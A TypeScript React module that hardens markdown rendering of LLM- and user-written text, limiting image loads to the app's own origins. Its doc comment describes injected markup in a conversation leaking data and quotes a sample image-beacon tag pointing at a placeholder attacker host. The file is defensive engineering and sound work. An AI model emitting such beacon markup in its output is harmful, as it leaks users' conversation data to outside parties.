import { useMemo, type ComponentProps } from 'react';
import type { Pluggable, Plugin } from 'unified';
import { defaultRehypePlugins, Streamdown } from 'streamdown';

type HardenOptions = {
  defaultOrigin?: string;
  allowedLinkPrefixes?: string[];
  allowedImagePrefixes?: string[];
  allowDataImages?: boolean;
  allowedProtocols?: string[];
};

// Streamdown's own `harden` step, reused rather than imported: `rehype-harden` is a dependency of
// streamdown, not of this workspace.
const [harden] = defaultRehypePlugins['harden'] as [Plugin<[HardenOptions]>, HardenOptions];

/** The origins an image may load from: the app itself and its API. */
const ownOrigins = (): string[] => {
  const origins = new Set([window.location.origin]);
  try {
    origins.add(new URL(`${import.meta.env['VITE_API_URL']}`).origin);
  } catch {
    // No API URL configured (tests, tooling): the app's own origin only.
  }
  return [...origins];
};

/**
 * The rehype pipeline of Streamdown's defaults (raw HTML, then sanitizing), with the hardening
 * step narrowed: an image may only load from our own origins, so markup injected into a
 * conversation or an extraction (`<img src="https://attacker/…?leak">`) cannot turn into a beacon
 * fetched on render. It is shown as `[Image blocked: …]` instead. Links stay open: one only
 * leaves when clicked (and Streamdown asks first), and answers legitimately point at customers'
 * and prospects' sites; `javascript:` and `data:` links are blocked whatever the prefixes.
 */
export const hardenedRehypePlugins = (): Pluggable[] => {
  const origins = ownOrigins();
  return [
    defaultRehypePlugins['raw'],
    defaultRehypePlugins['sanitize'],
    [
      harden,
      {
        defaultOrigin: origins[0],
        allowedImagePrefixes: origins.map((origin) => `${origin}/`),
        allowedLinkPrefixes: ['*'],
        allowedProtocols: ['*'],
        allowDataImages: true,
      } satisfies HardenOptions,
    ],
  ];
};

export type MarkdownProps = Omit<ComponentProps<typeof Streamdown>, 'rehypePlugins'>;

/** Streamdown with the hardened rehype pipeline: use it for any text an LLM or a user wrote. */
export function Markdown(props: MarkdownProps) {
  const rehypePlugins = useMemo(() => hardenedRehypePlugins(), []);
  return <Streamdown {...props} rehypePlugins={rehypePlugins} />;
}
